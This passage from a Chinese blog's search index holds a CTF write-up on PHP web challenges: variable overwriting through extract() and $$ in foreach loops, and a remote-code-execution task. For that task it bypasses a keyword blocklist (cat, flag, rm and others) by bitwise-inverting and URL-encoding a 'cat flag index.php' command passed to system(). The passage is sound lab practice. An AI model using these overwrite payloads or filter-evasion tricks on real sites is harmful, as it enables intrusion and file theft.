</p><blockquote><p>$flag=’xxxxxxxx’;<br>extract($_GET); //以get传参的值会进过extract()函数<br>if(isset($liwu)) { //判断是否设立了$liwu该变量<br>    $content=trim(file_get_contents($flag)); //读取$flag的变量并将它赋给$content变量<br>    if($liwu==$content) {<br>        echo’flag{xxxxxxxxxxx}’; //如果$liwu和$content这两个变量相等就输出flag<br>    }<br>    else {<br>        echo ‘please try other operation.’;<br>    }<br>}  </p></blockquote><p>因为我不知道flag是什么，所以正常情况下不可能使$content这个变量等于$flag来得到真正的flag，所以我使用extrace()函数当传参时将$flag原来的值覆盖，这样就可以让这两个变量相等，从而得到flag。于是构造以下形式  </p><blockquote><p>/?$liwu=&amp;$flag=</p></blockquote><p>这样我们将$flag=空的值覆盖了原来的flag的值，从而使$liwu=$flag得到真正的flag。<br><a href="https://imgchr.com/i/D6NIXR"><img src="https://s3.ax1x.com/2020/11/28/D6NIXR.md.png" alt="D6NIXR.md.png"></a><br>但是不知道为什么构造/?$liwu=123&amp;$flag=123这样的不行。  </p><h1 id="三，basic-rce2"><a href="#三，basic-rce2" class="headerlink" title="三，basic rce2"></a>三，basic rce2</h1><p>代码如下<br><a href="https://imgchr.com/i/D6Uk4S"><img src="https://s3.ax1x.com/2020/11/28/D6Uk4S.md.png" alt="D6Uk4S.md.png"></a><br>这道题目和第一题本质差别不大，都是要用到执行系统命令函数，但是可以看出多了一个preg_match()函数。这是一个正则表达式函数，这个函数可以匹配查字符串中的所要搜索的字符，从题目函数可以看出，他规定了以下字符串<br>more，less，flag，head，nl，tail，tac，cat，rm，cp，mv，*，{<br>也就是说，如果我get传参的字符串中有这些字符串就会被返回，也就是不能执行所传代码，所以说不能像第一题那样直接输入/?Rem=system(‘cat xxxx’);来查看文件，但是还是可以来查看文件目录的，（没规定ls这个字符）<br><a href="https://imgchr.com/i/D6Unun"><img src="https://s3.ax1x.com/2020/11/28/D6Unun.md.png" alt="D6Unun.md.png"></a><br>得到有flag的文件。<br>下一步便是如何绕过这个匹配，这里我选择了取反绕过（换行绕过没成功，应该是掌握的有点问题）也就是将命令 ‘cat flag index.php’取反后再进行url编码再构造/?Rem=system(~xxxxxxxxx);即可绕过关于cat flag的匹配。<br>‘cat flag index.php’取反编码如下  </p><blockquote><p>%27%9C%9E%8B%DF%99%93%9E%98%DF%96%91%9B%9A%87%D1%8F%97%8F%27</p></blockquote><p>构造payload后传参便得到flag<br><a href="https://imgchr.com/i/D6UuBq"><img src="https://s3.ax1x.com/2020/11/28/D6UuBq.md.png" alt="D6UuBq.md.png"></a>  </p><h1 id="四，PHP变量覆盖2"><a href="#四，PHP变量覆盖2" class="headerlink" title="四，PHP变量覆盖2"></a>四，PHP变量覆盖2</h1><p>代码如下<br><a href="https://imgchr.com/i/D6UG34"><img src="https://s3.ax1x.com/2020/11/28/D6UG34.md.png" alt="D6UG34.md.png"></a><br>这次函数变成了foreach()同时多了一个$$这样的字符，而$$是这道题目的关键。<br>$$abc表示对$abc这个变量进行赋值，<br>而使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。<br>所以这道题要利用这两个foreach函数来使上传的参数flag等于$flag，进而得到flag。<br>通过代码最后一行可以知道我们要将$flag里的值赋予$_200最后才能输出flag。于是利用第一个foreach函数来构造paylod  </p><blockquote><p>/?_200=flag</p></blockquote><p>这样的结果是$$_200=$$flag,也就是将原来$_200的值覆盖成$flag里的值，也就是真正的flag。<br>接着使用第二个foreach函数来构造payload使我post传过去的flag=$flag,进而打印出$_200,于是构造以下payload  </p><blockquote><p>flag=aaaaaaaaa</p></blockquote><p>这样的结果是$$flag=aaaaaaaaa，也就是将原来$flag里的值覆盖成aaaaaaaaa，这样我们上传的参数flag一定等于$flag，而真正的flag已经被赋予$_200,最后打印出真正的flag。<br><a href="https://imgchr.com/i/D6UaHx"><img src="https://s3.ax1x.com/2020/11/28/D6UaHx.md.png" alt="D6UaHx.md.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web习题练习1</title>
      <link href="%E7%BB%83%E4%B9%A0/undefined-undefined.html"/>
      <url>%E7%BB%83%E4%B9%A0/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>我的第一篇博客</p>]]></content>
      
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
